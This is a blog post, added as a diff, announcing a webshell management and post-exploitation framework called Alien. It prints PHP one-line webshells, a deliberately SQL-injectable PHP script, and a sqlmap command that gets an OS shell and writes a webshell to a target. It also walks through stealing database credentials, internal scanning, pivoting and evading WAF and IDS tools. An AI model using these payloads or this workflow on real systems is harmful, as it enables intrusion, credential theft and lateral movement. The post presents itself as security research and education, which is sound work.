@@ -1,0 +1,324 @@
+<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[Tools] Alien v5.0.0 | ISSAC/iss4cf0ng's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><script async src="https://www.googletagmanager.com/gtag/js?id=G-RQ7HTMYT8W"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-RQ7HTMYT8W');</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li><li class="navItem"><a class="navBlock" href="/Series/"><span class="navItemTitle">Series</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[Tools] Alien v5.0.0</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-07-22T16:35:51.000Z" id="date"> 2026-07-23</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-07-22T20:31:09.744Z" id="updated"> 2026-07-23</time></div></span><br><span>Word Count: <div class="control">993</div></span><br><span>Read Time: <div class="control">6 min</div></span></div></div><hr><div id="post-content"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Alien is a modular webshell framework developed for cybersecurity research and education.</p>
+<p>It provides a unified post-exploitation framework for managing different web technologies through reusable modules.</p>
+<p>Rather than embedding every feature inside the webshell itself, Alien treats webshells as lightweight execution layers responsible only for arbitrary code execution. Once arbitrary code execution is obtained, advanced capabilities—including file management, virtual shells, database interaction, plugins, traffic obfuscation, and pivoting—are provided by the framework.</p>
+<p>GitHub repository: <a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/Alien">Alien</a></p>
+<h1 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h1><p>This project was developed as part of my personal interest in studying cybersecurity. It is designed for legitimate penetration testing and educational purposes only.</p>
+<p>However, it may potentially be misused for malicious purposes.</p>
+<p>Please do NOT use this tool for any illegal activities.</p>
+<p>The author is not responsible for any misuse of, or damage caused by, this software.</p>
+<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>Alien was originally developed during my second year at university as my first webshell management tool. Although the project was functional, its architecture was difficult to maintain and lacked extensibility. As my experience in software engineering and offensive security grew, I decided to archive the original implementation and redesign the project from scratch.</p>
+<p>Today, Alien has evolved from a simple webshell management tool into a modular research platform for studying post-exploitation techniques across different web technologies.</p>
+<p>If you are not familiar with webshells or OneShells, please refer to the articles below:</p>
+<ul>
+<li><a href="https://iss4cf0ng.github.io/2026/07/20/2026-7-20-Webshell-Part1/">Understanding Webshells</a></li>
+<li><a href="https://iss4cf0ng.github.io/2026/07/20/2026-7-20-Webshell-Part2/">CGI Webshells</a></li>
+<li><a href="https://iss4cf0ng.github.io/2026/07/21/2026-7-21-Webshell-Part3/">Java and C#</a><ul>
+<li><a href="https://iss4cf0ng.github.io/2026/06/27/2026-6-27-NebulaPulsar/">NebulaPulsar</a></li>
+<li><a href="https://iss4cf0ng.github.io/2026/07/01/2026-7-1-NebulaPulsar2-0/">NebulaPulsar 2.0</a></li>
+</ul>
+</li>
+<li><a href="https://iss4cf0ng.github.io/2026/07/21/2026-7-21-EventHorizon/">Event Horizon</a></li>
+</ul>
+<h1 id="Why-Alien"><a href="#Why-Alien" class="headerlink" title="Why Alien?"></a>Why Alien?</h1><p>Web applications remain one of the most common attack surfaces in modern environments. Whether during penetration testing or real-world attacks, arbitrary code execution obtained through a web application often serves as the initial foothold.</p>
+<p>A simple webshell is usually sufficient to demonstrate a remote code execution (RCE) vulnerability. However, command execution alone is rarely enough for practical post-exploitation.</p>
+<p>Alien was designed to bridge this gap by providing a unified post-exploitation framework capable of leveraging arbitrary code execution across different web technologies.</p>
+<p>For example, suppose an application contains an arbitrary file upload vulnerability, we may upload the following webshell to the target server:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/1.png'><img src="/images/article/2026-7-23-Alien/1.png" width=700/>
+</p>
+
+<p>Of course this is never enough. Therefore, we can use Alien to leverage this vulnerability.</p>
+<h1 id="Demonstration"><a href="#Demonstration" class="headerlink" title="Demonstration"></a>Demonstration</h1><p>If we discover a SQL injection vulnerability, we can exploit it using sqlmap:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/2.png'><img src="/images/article/2026-7-23-Alien/2.png" width=700/>
+</p>
+
+<p>The proof-of-concept vulnerable PHP code is shown as follows:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// sqli.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;mysql&quot;</span>);<br><span class="hljs-variable">$index</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;index&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mysqli</span> -&gt; connect_errno) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed to connect to MySQL: &quot;</span> . <span class="hljs-variable">$mysqli</span> -&gt; connect_error;<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * from mysql.help_relation where help_topic_id = <span class="hljs-subst">$index</span>&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$mysqli</span> -&gt; <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><br><span class="hljs-comment">// Numeric array</span><br><span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span> -&gt; <span class="hljs-title function_ invoke__">fetch_array</span>(MYSQLI_NUM);<br><span class="hljs-title function_ invoke__">printf</span> (<span class="hljs-string">&quot;%s (%s)\n&quot;</span>, <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>]);<br><br><span class="hljs-variable">$result</span> -&gt; <span class="hljs-title function_ invoke__">free_result</span>();<br><br><span class="hljs-variable">$mysqli</span> -&gt; <span class="hljs-title function_ invoke__">close</span>();<br></code></pre></td></tr></table></figure>
+<p>In certain scenarios, we can leverage this vulnerability… if write permission is available and the current user has sufficient privileges:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sqlmap.py -u &#x27;YOUR URL&#x27; --os-shell<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/3.png'><img src="/images/article/2026-7-23-Alien/3.png" width=700/>
+</p>
+
+<p>This command provides us with a virtual shell, allowing us to execute single commands.</p>
+<p>Sometimes, however, our real target is an internal resource that is not directly accessible. Therefore, we need to perform post-exploitation.</p>
+<p>However, this simple command execution is definitely not enough, the available functionality is limited. In this case, we can use Alien to leverage this vulnerability.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">os-shell&gt; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;pass&quot;]);?&gt;&#x27;</span> &gt; eval.php<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/4.png'><img src="/images/article/2026-7-23-Alien/4.png" width=700/>
+</p>
+
+<p>Now, open <code>http://[YOUR TARGET]/webshell/eval.php</code> in the browser. We can see that the OneShell was successfully written into the remote server, and arbitrary code execution is achieved:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/5.png'><img src="/images/article/2026-7-23-Alien/5.png" width=700/>
+</p>
+
+<p>Finally, open Alien, add this URL into it, select the script for exploitation (<code>PHP</code>, <code>v8.X</code> and <code>OneShell</code>) and enter the parameter <code>pass</code>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/6.png'><img src="/images/article/2026-7-23-Alien/6.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/7.png'><img src="/images/article/2026-7-23-Alien/7.png" width=500/>
+</p>
+
+<p>If the validation is passed, then press the Save button. After it is saved, open the <code>Control Panel</code>. Then we can remotely manage the server with a wide range of post-exploitation features.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/8.png'><img src="/images/article/2026-7-23-Alien/8.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/9.png'><img src="/images/article/2026-7-23-Alien/9.png" width=700/>
+</p>
+
+<p>Webshells are often used during data breaches. For example, an attacker can find the password of MySQL in <code>phpMyAdmin/config.inc.php</code>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/10.png'><img src="/images/article/2026-7-23-Alien/10.png" width=700/>
+</p>
+
+<p>Add a new database configuration in Alien, then we are able to interact with the database:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/11.png'><img src="/images/article/2026-7-23-Alien/11.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/12.png'><img src="/images/article/2026-7-23-Alien/12.png" width=700/>
+</p>
+
+<p>Alien also provides a virtual terminal. Users can use this feature to establish SSH connections to other machines.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/13.png'><img src="/images/article/2026-7-23-Alien/13.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/14.png'><img src="/images/article/2026-7-23-Alien/14.png" width=700/>
+</p>
+
+<p>Alien also provides a plugin framework, allowing users to develop their own plugins. Although only a few plugins are currently available, I plan to add many more in future releases!</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/15.png'><img src="/images/article/2026-7-23-Alien/15.png" width=700/>
+</p>
+
+<p>You can use <strong>Void</strong> to scan the IP addresses in the internal network</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/16.png'><img src="/images/article/2026-7-23-Alien/16.png" width=700/>
+</p>
+
+<p>Using Alien’s built-in SOCKS5 proxy, external tools such as sqlmap can access internal web applications through the compromised server.</p>
+<p>Once another webshell has been deployed on an internal host, <strong>DriftingComet</strong> can be used to establish a pivot between compromised servers, allowing you to progressively reach deeper targets within the network.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/17.png'><img src="/images/article/2026-7-23-Alien/17.png" width=800/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/18.png'><img src="/images/article/2026-7-23-Alien/18.png" width=700/>
+</p>
+
+<p>If you are concerned about WAFs and IDSs, you can enable <strong>Event Horizon</strong> for evasion. DriftingComet also supports OneShells protected by Event Horizon.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/19.png'><img src="/images/article/2026-7-23-Alien/19.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/20.png'><img src="/images/article/2026-7-23-Alien/20.png" width=500/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-7-23-Alien/21.png'><img src="/images/article/2026-7-23-Alien/21.png" width=800/>
+</p>
+
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>It is now 4:00 a.m.</p>
+<p>I have so many things I wanted to say, yet somehow I am speechless.</p>
+<p>Alien was the project that earned me my first 100 GitHub stars during my second year at university. Looking back, I know it was far from perfect, but it taught me an incredible amount about software engineering and offensive security.</p>
+<p>This new version is a complete redesign built upon everything I have learned over the past few years.</p>
+<p>I still believe there is plenty of room for improvement, but if you like this tool, I would truly appreciate a ⭐ on the repository. Your support would be a great motivation for me to continue improving this tool!</p>
+<p>Thank you for taking the time to read this article and explore Alien. I sincerely hope you find it useful—or that it inspires you to build something of your own.</p>
+<h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/Wallpaper/whellchair.png'><img src="/images/meme/Wallpaper/whellchair.png" width=700/>
+</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/07/21/2026-7-21-EventHorizon/">Event Horizon: An Obfuscation Framework of Alien Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="utterances-sel"></button></div><div id="utterances-container"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/" width="200" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://x.com/iss4c_f0ng/"><i class="fab fa-twitter" alt="X"></i></a></div><div id="rss-feed"><a class="social" id="rss-copy-button" href="javascript:void(0)" title="Copy RSS link to clipboard"><span>RSS</span></a></div></div><div id="music"></div><div class="music-box"><hr style="border:1px solid #ccc; margin:10px 0"><p class="music-title">Feeling exhausted? Let's enjoy (やさしい) music!</p><p style="text-align:center; position: relative"><img class="music-anime" id="anime-img" src="/images/meme/himari_coffee.2.jpg" width="150" height="200"></p><div style="text-align:center"><button class="music-btn" id="music-prev">⏮</button><button class="music-btn" id="music-toggle">▶ Play Music</button><button class="music-btn" id="music-next">⏭</button></div><div style="margin-top:5px"><span id="music-index"></span></div><hr style="border:1px solid #ccc; margin:10px 0"><audio id="bg-music"><source src="/mp3/music/music_1.mp3" type="audio/mpeg"></audio><script>document.addEventListener("DOMContentLoaded", function () {
+  var playlist = [
+    "/mp3/music/music_1.mp3",
+    "/mp3/music/sugar_story.mp3",
+    "/mp3/music/story_music_box.mp3",
+    "/mp3/music/last_page.mp3",
+    "/mp3/music/sunset_memory.mp3",
+    "/mp3/music/welcome_home.mp3",
+    "/mp3/music/canon.mp3",
+    "/mp3/music/arigadou.mp3",
+  ];
+
+  var current = 0;
+  const audio = document.getElementById("bg-music");
+  const btn = document.getElementById("music-toggle");
+  const prevBtn = document.getElementById("music-prev");
+  const nextBtn = document.getElementById("music-next");
+  const indexDisplay = document.getElementById("music-index");
+
+  function updateDisplay() {
+    indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;
+  }
+
+  updateDisplay();
+
+  btn.addEventListener("click", function () {
+    if (audio.paused) {
+      audio.src = playlist[current];
+      audio.play();
+      btn.innerText = "⏸ Pause Music";
+    } else {
+      audio.pause();
+      btn.innerText = "▶ Play Music";
+    }
+  });
+
+  nextBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current = (current + 1) % playlist.length;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  prevBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current--;
+
+    if (current < 0)
+      current = playlist.length - 1;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  audio.addEventListener("ended", function() {
+    current = (current + 1) % playlist.length;
+    audio.src = playlist[current];
+    audio.play();
+    updateDisplay();
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const animeImg = document.getElementById("anime-img");
+
+  animeImg.addEventListener("click", function() {
+    
+    const tip = document.createElement("div");
+    tip.innerText = "?";
+    tip.style.position = "absolute";
+    tip.style.top = "-50px";
+    tip.style.left = "50%";
+    tip.style.transform = "translateX(-50%)";
+    tip.style.backgroundColor = "#fff";
+    tip.style.color = "rgb(16, 174, 11)";
+    tip.style.padding = "2px 6px";
+    tip.style.border = "1px solid #ccc";
+    tip.style.borderRadius = "8px";
+    tip.style.boxShadow = "0 3px 6px rgba(0,0,0,0.2)";
+    tip.style.fontSize = "50px";
+    tip.style.fontWeight = "bold";
+    tip.style.zIndex = "1000";
+    tip.style.opacity = "1";
+    tip.style.transition = "opacity 1s, top 1s";
+    
+    animeImg.parentElement.appendChild(tip);
+
+    setTimeout(() => {
+      tip.style.opacity = "0";
+      tip.style.top = "-60px";
+      setTimeout(() => tip.remove(), 1000);
+    }, 2000);
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const rssBtn = document.getElementById("rss-copy-button");
+
+  rssBtn.addEventListener("click", async () => {
+    const rssUrl = window.location.origin + "/atom.xml";
+    try {
+      await navigator.clipboard.writeText(rssUrl);
+
+      const tip = document.createElement("div");
+      tip.innerText = "RSS link copied!";
+      tip.style.position = "absolute";
+      tip.style.top = "-30px";
+      tip.style.left = "50%";
+      tip.style.transform = "translateX(-50%)";
+      tip.style.backgroundColor = "#0d0d0d";
+      tip.style.color = "#00fff7";
+      tip.style.border = "1px solid #ff00ff";
+      tip.style.boxShadow = "0 0 8px #ff00ff, 0 0 16px #00fff7";
+      tip.style.padding = "2px 6px";
+      tip.style.borderRadius = "8px";
+      tip.style.fontSize = "14px";
+      tip.style.fontWeight = "bold";
+      tip.style.zIndex = "1000";
+      tip.style.opacity = "1";
+      tip.style.transition = "opacity 1s, top 1s";
+
+      rssBtn.style.position = "relative";
+      rssBtn.appendChild(tip);
+
+      setTimeout(() => {
+        tip.style.opacity = "0";
+        tip.style.top = "-40px";
+        setTimeout(() => tip.remove(), 1000);
+      }, 2000);
+
+    } catch (err) {
+      console.error("Failed to copy: ", err);
+    }
+  });
+});
+</script></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Disclaimer"><span class="toc-number">2.</span> <span class="toc-text">Disclaimer</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Background"><span class="toc-number">3.</span> <span class="toc-text">Background</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Why-Alien"><span class="toc-number">4.</span> <span class="toc-text">Why Alien?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Demonstration"><span class="toc-number">5.</span> <span class="toc-text">Demonstration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">7.</span> <span class="toc-text">THANKS FOR READING</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/custom.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>
